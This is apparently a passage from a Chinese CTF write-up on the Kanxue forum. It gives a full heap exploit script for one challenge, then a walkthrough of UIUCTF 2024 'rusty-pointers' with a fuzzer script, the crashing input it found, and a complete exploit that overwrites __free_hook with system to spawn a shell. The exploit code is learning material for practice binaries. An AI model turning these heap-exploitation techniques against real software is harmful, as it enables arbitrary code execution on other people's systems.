
```python
from pwn import *

libc=ELF('./libc-2.27.so')

def cho(num):

    r.sendlineafter(b'> ',str(num).encode())



def add(x,y,name=b'\x00'):

    cho(0)

    data=r.recv()

    print(data)

    if b"two many" in data:

        raise EOFerror

    r.sendline(str(x).encode())

    r.sendlineafter(b"value: ",str(y).encode())

    r.sendafter(b"new element name: ",name.ljust(0x20,b'\x00'))



def delet(x,y):

    cho(1)

    r.sendlineafter(b"want element x-coordinate value: ",str(x).encode())

    r.sendlineafter(b"want element y-coordinate value: ",str(y).encode())



def edit(x,y,name):

    cho(2)

    r.sendlineafter(b"want element x-coordinate value: ",str(x).encode())

    r.sendlineafter(b"want element y-coordinate value: ",str(y).encode())

    r.sendafter(b"name: ",name.ljust(0x20,b'\x00'))



def show(x,y):

    cho(3)

    r.sendlineafter(b'value',str(x).encode())

    r.sendlineafter(b'value',str(y).encode())



def query(a,b,c,d):

    cho(4)

    r.sendlineafter(b"value: ",str(a).encode())

    r.sendlineafter(b"value: ",str(b).encode())

    r.sendlineafter(b"value: ",str(c).encode())

    r.sendlineafter(b"value: ",str(d).encode())

def bug():

    gdb.attach(r)

r=process('./pwn')

#r=remote("node5.anna.nssctf.cn",23868)

add(1,1,str(10).encode())

add(0,6,str(20).encode())

add(7,2,str(30).encode())

add(2,0,str(40).encode())

add(1,3,str(50).encode())

add(3,4,str(60).encode())

add(6,5,str(70).encode())

add(4,8,str(80).encode())

delet(0,6)

add(3,7,str(90).encode())

add(7,6,str(110).encode())

add(2,2,b"aaa")

add(2,3,b'a'*8)

delet(2,3)

delet(2,2)

delet(1,3)

#delet(1,3)



query(1,0,5,5)

r.recvuntil(b"2-th name: ")

heap=u64(r.recv(8))-0x5c0

print(f"heap=>{hex(heap)}")

head=heap+0x580

#===============================================================

edit(1,3,p64(heap+0x10+0x48))

add(4,1)#

add(4,2)                    #control_ptr(4,2)

edit(4,2,p64(heap+0x10))

add(4,3,p8(5)*2)            #control_num(4,3)

head=heap+0x580

edit(4,2,p64(heap+0x30))

add(4,4,p8(7))

#===============================================================

edit(4,2,p64(head-0x18))

add(5,5)

edit(4,2,p64(head))

add(4,5,p64(0)+p64(0x221))

edit(4,2,p64(head+0x10))

add(5,1)

delet(5,1)

bug()

query(0,0,6,6)

r.recvuntil(b"12-th name: \x00\x00\x00\x00\x00\x00\x00\x00!\x02\x00\x00\x00\x00\x00\x00")

base=u64(r.recv(8))-0x3ebca0

print(f"base=>{hex(base)}")

#===============================================================

fhook=base+libc.sym.__free_hook

system=base+libc.sym.system

edit(4,2,p64(fhook-8))

add(5,6,b"/bin/sh\x00"+p64(system))



delet(5,6)

r.interactive()
```
# 2.2 UIUCTF 2024 rusty-pointers

题目链接 : [UIUCTF](https://bbs.kanxue.com/elink@f1aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9h3N6H3N6$3&6&6i4K6u0r3g2f1W2g2b7#2c8r3i4K6u0V1x3U0l9J5y4q4)9J5k6q4m8#2j5X3I4A6j5#2)9J5c8Y4c8J5k6h3g2Q4x3V1k6E0j5h3W2F1i4K6u0r3j5$3S2S2L8r3I4W2L8X3N6W2M7#2)9J5c8Y4m8%4L8W2)9J5c8Y4u0#2M7%4c8&6i4K6u0V1M7r3!0A6L8Y4c8W2M7Y4x3`.)

首先是elf文件,虽然这道题看不看IDA已经无所谓了(看不懂rust),直接对着gdb调就可以

![](https://bbs.kanxue.com/upload/attach/202507/1024538_SV9A9KXSP8F34RW.webp)

经典菜单题

`create`可以选择创建`rules`和`notes`两个不同的堆块

通过gdb调试发现,rule堆块在创建后立马被释放,而notes堆块会保存下来

![](https://bbs.kanxue.com/upload/attach/202507/1024538_V5EFHNPEVUCBP7N.webp)

`delet`,`read`,`edit`都要指清楚堆块的类型和编号

其中`edit`需要我们输入64字节数据

![](https://bbs.kanxue.com/upload/attach/202507/1024538_JCU2JAGWFKXSMJU.webp)

`Make a law` 直接给了`libc`地址,`libc`为2.31,可以劫持`__free_hook`

我们的fuzz脚本需要随机在`create`,`delet`,`edit`中选取进行操作,且最后需要`exit`(防止在一个脚本里跑太久导致poc太长)

## 2.2.1 test.py(用于产生随机操作序列)

```
import random

import string

operations = ""



total_ops = random.randint(1, 20)#操作次数在1~19中随机

total_rules = 0

total_notes = 0



for i in range(total_ops):

    op = random.choice([1, 2, 4])#从create,edit,delet中随机选择

    if op == 1:

        operations += "1\n"

        choose = random.randint(1, 2)

        operations += str(choose) + "\n"

        if choose == 1:#两种不同的create会分别增加两种chunk的数量

            total_rules += 1

        elif choose == 2:

            total_notes += 1



    elif op == 2:

        operations += "2\n"

        choose1 = random.randint(1, 2)#随机释放堆块

        operations += str(choose1) + "\n"

        if choose1 == 1 and total_rules > 0 :

            choose2 = random.randint(0, total_rules-1)

            operations += str(choose2) + "\n"

            total_rules -= 1#注意减少py中chunk的数量,确保只释放已存在的堆块

        elif choose1 == 2 and total_notes > 0 :

            choose2 = random.randint(0, total_notes-1)

            operations += str(choose2) + "\n"

            total_notes -= 1

        else :

            operations = operations[:(len(operations)-4)]#如果chunk数量为0,那么去除此次操作

    elif op == 4:

        operations += "4\n"

        choose1 = random.randint(1, 2)

        operations += str(choose1) + "\n"

        characters = string.ascii_letters + string.digits

        random_string = ''.join(random.choice(characters) for _ in range(63))#向随机chunk中写入64字节随机数据

        if choose1 == 1 and total_rules > 0 :

            choose2 = random.randint(0, total_rules-1)

            operations += str(choose2) + "\n"

            operations += random_string + "\n"

            total_rules -= 1

        elif choose1 == 2 and total_notes > 0 :

            choose2 = random.randint(0, total_notes-1)

            operations += str(choose2) + "\n"

            operations += random_string + "\n"

            total_notes -= 1

        else :

            operations = operations[:(len(operations)-4)]#同理如果chunk数量为0则去除此次操作



print(operations + "6")#最后一定要退出
```

## 2.2.2 fuzzer(使用shell脚本,用于传递序列化数据,检测异常)

```
#!/bin/bash

while ((1))

do

    python3 ./test.py > poc#将test.py中的数据放入poc中(poc负责保存记录)

    cat poc | ./pwn#将poc中的数据喂给elf

    if [ $? -ne 0 ]; then#检测elf的返回值(如果不为0则发生异常,说明触发漏洞,此时退出)

        break

    fi

done
```

跑一会儿就能看到异常退出,我们将poc简单使用函数包装,使用gdb调试

```
ch(1)

ch(2)

ch(1)

ch(1)

ch(2)

ch(2)

ch(0)

ch(2)

ch(1)

ch(0)

ch(1)

ch(1)

ch(1)

ch(1)

ch(4)

ch(1)

ch(1)

io.send(b"P56DpQlpxKiRRzvnSNza6rP4vz2hJsgAWyagEGe9tyVNrqZdUO8S7Gg6KZRTzGL")

ch(4)

ch(1)

ch(0)

io.send(b"q7vM0fZpYeCUblwTVxszBf7i2r1EwHD52mCBauDL03Ico2eOPhwO2jUlmbUtO3H")
```

可以看到

![](https://bbs.kanxue.com/upload/attach/202507/1024538_HPPTJ33SPN6GRZQ.webp)

随后一次`edit`时产生了uaf,而且我们掌握了`libc`地址,那就劫持`__free_hook`完事了

我们还需要把poc中的操作仔细看一遍,把chunk的编号标记清楚

## 2.2.3 EXP

```
from pwn import *

io=process('./pwn')

libc=ELF('./libc-2.31.so')

def bug():

    gdb.attach(io)

def ch(Id):

    io.sendlineafter(b"> ",str(Id).encode())

def add(Id):

    ch(1)

    ch(Id)

ch(5)

base=int(io.recv(14),16)-0x1ecbe0

print(f"base=>{hex(base)}")

#====#   create note 0

ch(1)#

ch(2)#

#====#   create rule 0   

ch(1)#

ch(1)#

#====#   delet note 0

ch(2)#

ch(2)#

ch(0)#

#====#   delet rule 0

ch(2)#

ch(1)#

ch(0)#

#====#   create rule 0

ch(1)#

ch(1)#

#====#   create rule 1

ch(1)#

ch(1)#

#====#   edit rule 1   

ch(4)#

ch(1)#

ch(1)#

io.send(b"0")

#====#   edit rule 0

ch(4)#

ch(1)#

ch(0)#

fhook=base+libc.sym.__free_hook

system=base+libc.sym.system

io.send(p64(fhook-8))

#====# create note 0

ch(1)#

ch(2)#

#====# create note 1

ch(1)#

ch(2)#

#====# edit note 1

ch(4)#

ch(2)#

ch(1)#

io.send(b"/bin/sh".ljust(8,b'\x00')+p64(system))

print(hex(fhook))

#====#  delet note 1 == system("/bin/sh")

ch(2)#

ch(2)#

ch(1)#

io.interactive()
```

![](https://bbs.kanxue.com/upload/attach/202507/1024538_UHNQ8B9C7X397DM.webp)

成功执行`system("/bin/sh")`

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2025-7-8 23:06

被zer00ne编辑

，原因：

[#专题](https://bbs.kanxue.com/forum-171-1-186.htm)

上传的附件：

- [Rtree](javascript:void(0);)

  （26.80kb，5次下载）

- [rust_ptr.zip](javascript:void(0);)

  （2.99MB，5次下载）
